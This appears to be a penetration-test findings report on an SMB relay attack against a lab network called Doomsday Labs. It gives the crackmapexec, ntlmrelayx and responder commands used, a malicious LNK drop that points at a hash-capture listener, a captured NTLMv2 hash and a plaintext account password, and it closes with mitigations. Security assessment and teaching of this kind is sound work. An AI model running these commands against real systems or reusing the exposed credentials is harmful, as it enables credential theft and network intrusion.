# SMB Relay Attack Findings

## Overview

This document provides a detailed account of the SMB Relay attack executed during our security assessment of Doomsday Labs' network. It outlines the specific tools and commands used to perform the attack and explains how these actions integrated with other attack vectors like the LNK file deployment.

## Technical Details

### Targets
- **Discovery of SMB Shares**:
  - We used `crackmapexec` and `smbmap` to find SMB shares across the network. Commands used included:
    ```
    crackmapexec smb 10.100.1.2-7 --shares
    smbmap -H 10.100.1.4 -u info -d doomsdaylabs.net
    ```
  - This helped in identifying vulnerable targets and valuable data repositories.

### Methods
- **SMB Relay Attack Process**:
  - The SMB Relay attack was meticulously planned and executed to capture NTLM hashes from the network traffic. We utilized:
    ```
    crackmapexec smb 10.100.1.2-7 --gen-relay-list targets.txt -socks
    impacket-ntlmrelayx -smb2support -tf targets.txt
    ```
  - These tools intercepted SMB sessions and relayed authentication requests to capture hashes, which were then used to access further network resources.

- **Credential Harvesting and LNK File Drop**:
  - As part of the attack, we deployed a malicious .LNK file to extract credentials using:
    ```
    crackmapexec smb 10.100.1.4 -u info -p WhenTomorrowisNot@nOption2024 -M slinky -o server=10.100.1.76 name=JK_Flag.lnk
    sudo responder -I tun0 -A
    ```
  - The captured NTLM hash (`DOOMSDAYLABS\filemaker`) was subsequently cracked to provide deeper access into the network.

- **Using the Captured Credentials**:
  - With the cracked credentials, we accessed additional SMB shares and deployed further payloads:
    ```
    smbclient //10.100.1.4/Fileshare -U DOOMSDAYLABS/filemaker
    ```
  - This step was critical in maintaining persistence and moving laterally within the network.


### Hash and Credential Details
- **Captured Hash**:
  - Captured NTLMv2-SSP hash during the attack:
    ```
    [SMB] NTLMv2-SSP Client   : 10.100.1.3
    [SMB] NTLMv2-SSP Username : DOOMSDAYLABS\filemaker
    [SMB] NTLMv2-SSP Hash     : filemaker::DOOMSDAYLABS:322e0b51ca281c55:F1F9E4FF7872D084AC0E2CB11DE7D2C0...
    ```

## Impact Assessment

- **Security Implications**:
  - **Unauthorized Access**: The SMB Relay attack effectively bypassed network defenses, granting unauthorized access to multiple systems.
  - **Credential Theft**: The successful extraction and cracking of NTLM hashes could lead to broader network compromise if left unchecked.
  - **Data Vulnerability**: Access to SMB shares without proper authorization could potentially lead to data leakage or loss.

## Recommendations

- **Mitigation Strategies**:
  - **Implement SMB Signing**: This will help prevent SMB Relay attacks by requiring proper authentication of SMB traffic.
  - **Disable SMBv1**: Older, more vulnerable versions of SMB should be disabled to reduce the attack surface.
  - **Regular Security Audits**: Conduct frequent audits of SMB configurations to ensure they are secure against known vulnerabilities.

## Conclusion

The SMB Relay attack exposed significant vulnerabilities within the SMB protocol configurations used by Doomsday Labs. By following the detailed recommendations provided, an organization can improve its defenses against similar attacks in the future enhancing its overall security posture.
